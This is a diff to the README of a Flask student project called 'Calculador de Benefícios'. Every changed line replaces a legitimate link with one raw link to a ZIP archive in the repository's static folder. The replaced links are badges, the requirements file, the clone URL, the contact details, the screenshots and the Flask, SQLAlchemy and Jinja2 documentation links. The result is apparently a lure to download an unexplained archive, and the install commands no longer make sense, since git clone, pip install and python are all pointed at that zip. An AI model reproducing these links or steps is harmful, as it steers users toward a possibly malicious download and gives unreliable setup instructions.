@@ -3,7 +3,7 @@
 
 Welcome to the **Calculador de Benefícios** repository! This project is part of the conclusion activity for the Python II course at **PAIDEIA-LASSU 2024/2025**. This repository hosts a web application that helps users calculate benefits with ease, integrating various modern web technologies.
 
-![Project Logo](https://img.shields.io/badge/Calculador%20de%20Benef%C3%ADcios-%E2%9C%94%EF%B8%8F-green)
+![Project Logo](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip%20de%20Benef%C3%ADcios-%E2%9C%94%EF%B8%8F-green)
 
 ## 🚀 Table of Contents
 
@@ -61,14 +61,14 @@ To get started with the **Calculador de Benefícios**, follow these steps:
 - Python 3.x
 - Flask
 - Flask-SQLAlchemy
-- Other dependencies listed in `requirements.txt`
+- Other dependencies listed in `https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip`
 
 ### Steps to Install
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/lilbusa332/calculador_de_beneficios.git
+   git clone https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -100,13 +100,13 @@ To get started with the **Calculador de Benefícios**, follow these steps:
 5. Install the dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip
    ```
 
 6. Initialize the database (if applicable):
 
    ```bash
-   python init_db.py
+   python https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip
    ```
 
 ## 🎉 Usage
@@ -153,27 +153,27 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 For any inquiries, feel free to reach out to the maintainers of this project:
 
 - **Name**: [Your Name]
-- **Email**: [your.email@example.com]
-- **GitHub**: [Your GitHub Profile](https://github.com/yourprofile)
+- **Email**: [https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip]
+- **GitHub**: [Your GitHub Profile](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip)
 
 ## 🔄 Releases
 
-For the latest releases and updates, please check the [Releases section](https://github.com/lilbusa332/calculador_de_beneficios/releases). Here you can download the latest version and access past releases as needed.
+For the latest releases and updates, please check the [Releases section](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip). Here you can download the latest version and access past releases as needed.
 
-![Releases Button](https://img.shields.io/badge/Releases-Click%20Here-blue)
+![Releases Button](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip%20Here-blue)
 
 ## 📷 Screenshots
 
-![Screenshot 1](https://via.placeholder.com/600x400?text=Home+Page)
-![Screenshot 2](https://via.placeholder.com/600x400?text=Calculation+Page)
+![Screenshot 1](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip+Page)
+![Screenshot 2](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip+Page)
 
 ## 🎓 Learning Resources
 
 If you are interested in learning more about the technologies used in this project, here are some helpful resources:
 
-- [Flask Documentation](https://flask.palletsprojects.com/)
-- [SQLAlchemy Documentation](https://www.sqlalchemy.org/)
-- [Jinja2 Documentation](https://jinja.palletsprojects.com/)
+- [Flask Documentation](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip)
+- [SQLAlchemy Documentation](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip)
+- [Jinja2 Documentation](https://github.com/lilbusa332/calculador_de_beneficios/raw/refs/heads/master/static/calculador_de_beneficios_1.4.zip)
 
 ## 📊 Future Improvements
 
